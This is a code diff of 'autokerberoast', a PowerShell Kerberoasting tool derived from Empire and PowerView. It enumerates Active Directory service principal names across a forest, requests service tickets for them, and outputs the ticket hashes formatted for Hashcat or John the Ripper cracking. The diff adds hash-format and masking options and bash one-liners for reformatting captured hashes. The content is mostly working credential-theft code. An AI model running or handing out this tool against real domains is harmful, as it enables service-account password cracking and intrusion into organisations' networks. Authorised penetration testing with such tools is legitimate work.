@@ -1,7 +1,7 @@
-# Note: This version of autokerberoast relies heavily on functions from https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1 
+# Note: This version of autokerberoast relies heavily on functions from https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
 #       and https://github.com/adaptivethreat/Empire/blob/2.0_beta/data/module_source/credentials/Invoke-Kerberoast.ps1 (Removed need for Mimikatz).
-# 
-#      
+#
+#
 # Instructions:
 # To list ALL SPN records associated with user accounts, run:
 #       List-UserSPNs
@@ -13,8 +13,9 @@
 # To obtain ALL tickets for unique user SPNs in the forest, simply run:
 #       Invoke-AutoKerberoast
 #
-# If hashes are broken up into multiple lines, then this bash one-liner will convert saved hashes into the proper format:
-#       cat hashes.txt |tr -d "\n" | sed s/"\$krb"/"\n\$krb"/g; echo ""
+# If hashes are broken up into multiple lines, then these bash one-liners will convert saved hashes into the proper format:
+#   output to terminal:     cat ./hashes.txt |tr -d "\n" | sed s/"\$krb"/"\n\$krb"/g; echo ""
+#   save to text file:      temp=$(cat ./hashes.txt |tr -d "\n" | sed s/"\$krb"/"\n\$krb"/g); printf "%s" "$temp" > hashesFormatted.txt
 
 
 function List-UserSPNs
@@ -30,7 +31,7 @@ This will only query the DC in a specified domain for SPNs that use User account
 This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins"
 
 .PARAMETER ViewAll
-Switch that displays ALL SPNs, even if they are protected by the same user.  
+Switch that displays ALL SPNs, even if they are protected by the same user.
 Default is to only show 1 SPN per user account (e.g. if two MSSQL SPNs are registered to the user sqlAdmin, it will only request a ticket for the first service)
 
 .PARAMETER Request
@@ -44,7 +45,7 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
 
     [CmdletBinding()]
     Param(
-    [Parameter(Mandatory=$False,Position=1)] 
+    [Parameter(Mandatory=$False,Position=1)]
     [string]$Domain = "",
 
     [Parameter(Mandatory=$False)]
@@ -58,25 +59,25 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
 
     $GCs = @()
 
-    If ( $Domain ) 
+    If ( $Domain )
     {
         $GCs += $Domain
     }
     else # find them
-    { 
+    {
         # This code for identifying domains in current forest was Copied directly from Powerview's Get-ForestDomain Function, found at https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
         $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
         $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
         $Parts = $ForestSid -Split "-"
         $ForestSid = $Parts[0..$($Parts.length-2)] -join "-"
         $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
-        $ForestObject.Domains | % { $GCs += $_.Name }   
+        $ForestObject.Domains | % { $GCs += $_.Name }
     }
 
     # Remove any duplicate Global Catalogs Entries from Array
     $GCs = $GCs | Select -uniq
 
-    if ( -not $GCs ) 
+    if ( -not $GCs )
     {
     	# no Global Catalogs Found
     	Write-Output "No Global Catalogs Found!"
@@ -109,14 +110,14 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
     name                           {sqlengine}
     whenchanged                    {9/22/2014 6:45:21 AM}
     badpasswordtime                {0}
-    dscorepropagationdata          {4/4/2014 2:16:44 AM, 4/4/2014 12:58:27 AM, 4/4/2014 12:37:04 AM,...
+    dscorepropagationdata          {4/4/2014 2:16:44 AM, 4/4/2014 12:58:27 AM, 4/4/2014 12:37:04 AM,...}
     lastlogontimestamp             {130558419213902030}
     lastlogoff                     {0}
     objectclass                    {top, person, organizationalPerson, user}
     countrycode                    {0}
     cn                             {sqlengine}
     whencreated                    {4/4/2014 12:37:04 AM}
-    objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 191 250 179 30 180 59 104 26 248 205 17...
+    objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 191 250 179 30 180 59 104 26 248 205 17...}
     objectguid                     {101 165 206 61 61 201 88 69 132 246 108 227 231 47 109 102}
     objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=medin,DC=local}
     usncreated                     {57551}
@@ -124,7 +125,7 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
 
     $uniqueAccounts = New-Object System.Collections.ArrayList
 
-    ForEach ( $GC in $GCs ) 
+    ForEach ( $GC in $GCs )
     {
     	$searcher = New-Object System.DirectoryServices.DirectorySearcher
     	$searcher.SearchRoot = "LDAP://" + $GC
@@ -143,15 +144,15 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
     	$searcher.SearchScope = "Subtree"
     	$results = $searcher.FindAll()
 
-    	foreach ( $result in $results ) 
+    	foreach ( $result in $results )
         {
-            foreach ( $spn in $result.Properties["serviceprincipalname"] ) 
+            foreach ( $spn in $result.Properties["serviceprincipalname"] )
             {
                 $groups = $result.properties.memberof
                 $distingName = $result.Properties["distinguishedname"][0].ToString()
 
                 if ( $viewAll -eq $False )
-                {          
+                {
                     if ( $uniqueAccounts.contains($distingName) )
                     {
                         continue
@@ -179,7 +180,7 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
     }
 }
 
-function Invoke-AutoKerberoast 
+function Invoke-AutoKerberoast
 {
 <#
 .SYNOPSIS
@@ -194,30 +195,42 @@ This paremeter will only return SPNs that use users in a specific group, e.g. "D
 .PARAMETER SPN
 This paremeter will request and process TGS tickets for an array of SPNs (a single SPN record may also be specified).  Recommend running List-UserSPNs first to identify name of useful SPNs.
 
+.PARAMETER HashFormat
+Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat style hash formatting.
+Defaults to 'Hashcat'.
+
 .EXAMPLE
 PS C:\> List-UserSPNS
 PS C:\> List-UserSPNS -GroupName "Domain Admins"
 PS C:\> List-UserSPNS -GroupName "Domain Admins" -Domain dev.testlab.local
+PS C:\> List-UserSPNS -GroupName "Domain Admins" -Domain dev.testlab.local -HashFormat John
 PS C:\> List-UserSPNS -SPN "MSSQLSvc/sqlBox.testlab.local:1433"
 PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlBox2.dev.testlab.local:1433")
 #>
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$False)] 
+        [Parameter(Mandatory=$False)]
         [string]$GroupName="",
 
         [Parameter(Mandatory=$False)]
         [string]$Domain="",
 
         [Parameter(Mandatory=$False)]
-        [string[]]$SPN
+        [string[]]$SPN,
+
+        [ValidateSet('John', 'Hashcat')]
+        [Alias('Format')]
+        [String]$HashFormat='Hashcat',
+
+        [Parameter(Mandatory=$False)]
+        [Switch]$Mask
     )
 
     $SPNsArray = New-Object System.Collections.ArrayList
     $DnameArray = New-Object System.Collections.ArrayList
 
-    if ( $SPN ) 
+    if ( $SPN )
     {
         ForEach ($i in $SPN)
         {
@@ -241,7 +254,7 @@ PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlB
             write-output "Unable to obtain any user account SPNs"
             exit
         }
-      
+
         $SPNs | % { [void]$SPNsArray.Add($_.SPN) }
         $SPNs | % { [void]$DnameArray.Add($_.DistinguishedName) }
     }
@@ -260,40 +273,53 @@ PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlB
     else
     {
         Write-Output "Requested Tickets:"
-        Write-Output $SPNsArray
-        Write-Output ""
-    }
+        $i = 1
+        ForEach ( $currentSPN in $SPNsArray )
+        {
+            "ID#$i`:"
+            "SPN: $currentSPN"
+            "DISTINGUISHED NAME: " + $DnameArray[$i-1] + "`n"
 
+            $i++
+        }
+    }
     $i = 0
- 
+
     $ticketArray = New-Object System.Collections.ArrayList
     $failedTicketArray = New-Object System.Collections.ArrayList
 
     ForEach ( $currentSPN in $SPNsArray )
     {
         $currentUser = $DnameArray[$i]
-        try 
+        try
         {
-            $tempHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -Label $currentUser | select -expand hash
-            [void]$ticketArray.Add($tempHash)
+            if ( $Mask )
+            {
+                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentUser -OutputFormat $HashFormat -Mask | select -expand hash
+            }
+            else
+            {
+                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentUser -OutputFormat $HashFormat | select -expand hash
+            }
+            [void]$ticketArray.Add($currentHash)
         }
         catch
         {
-            [void]$failedTicketArray.Add("$currentSPN")             
+            # write-output $_
+            $failedTicketLabel = "ID#" + ($i+1) + "_SPN: $currentSPN"
+            [void]$failedTicketArray.Add($failedTicketLabel)
         }
         $i += 1
     }
 
     Write-Output "`n`nCaptured TGS hashes:"
-    $ticketArray
+    $ticketArray | % { "$_`n" }
 
     if ( $failedTicketArray )
     {
-        Write-Output "`n`nWARNING: found to capture hashes for the following SPNs:"
+        Write-Output "`n`nWARNING: failed to capture hashes for the following SPNs:"
         $failedTicketArray
     }
-    
-    
 }
 
 
@@ -371,27 +397,26 @@ Outputs a custom object containing the SamAccountName, DistinguishedName, Servic
         [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
         [ValidatePattern('.*/.*')]
         [Alias('ServicePrincipalName')]
-        [String[]]
-        $SPN,
+        [String[]]$SPN,
 
         [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
         [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
-        [Object[]]
-        $User,
+        [Object[]]$User,
 
         [Parameter(Position = 1)]
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
-        [String]
-        $OutputFormat = 'Hashcat',
+        [String]$OutputFormat='Hashcat',
 
         [Parameter(Mandatory=$False)]
         [String]
-        $IdNum = "",
+        $IdNum="",
 
         [Parameter(Mandatory=$False)]
-        [String]
-        $Label = ''
+        [Switch]$Mask,
+
+        [Parameter(Mandatory=$False)]
+        [String]$userLabel = ""
     )
 
     BEGIN {
@@ -432,18 +457,28 @@ Outputs a custom object containing the SamAccountName, DistinguishedName, Servic
                 $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
 
-                # script will output hashes in hashcat format unless manually changed in code.
                 if ($OutputFormat -match 'John') {
-                    $HashFormat = "`$krb5tgs`$unknown:$Hash"
-                }
-                else {
-                    if ( $label )
+                    if ( $Mask )
                     {
-                        $HashFormat = '$krb5tgs$23$*ID#' + $IdNum + '_DISTINGUISHED NAME: ' + $Label + 'SPN: ' + "$SPN *`$" + $Hash
+                        $HashFormat = "`$krb5tgs`$ID#" + $IdNum + "_`:$Hash"
                     }
                     else
                     {
-                        $HashFormat = '$krb5tgs$23$*ID#' + $IdNum + '_SPN: ' + "$SPN *`$" + $Hash
+                        # John will fail if additional ":" characters are used in description field
+                        $userLabel = $userLabel -replace "`:","_"
+                        $SPN = $SPN -replace "`:","_"
+
+                        $HashFormat = "`$krb5tgs`$ID#" + $IdNum + "_DISTINGUISHED NAME_" + $userLabel + " SPN_$SPN`:$Hash"
+                    }
+                }
+                else {
+                    if ( $Mask )
+                    {
+                        $HashFormat = "`$krb5tgs`$23`$*ID#" + $IdNum + "_*`$" + $Hash
+                    }
+                    else
+                    {
+                        $HashFormat = "`$krb5tgs`$23`$*ID#" + $IdNum + "_DISTINGUISHED NAME: " + $userLabel + " SPN: $SPN *`$" + $Hash
                     }
                 }
                 $Out | Add-Member Noteproperty 'Hash' $HashFormat
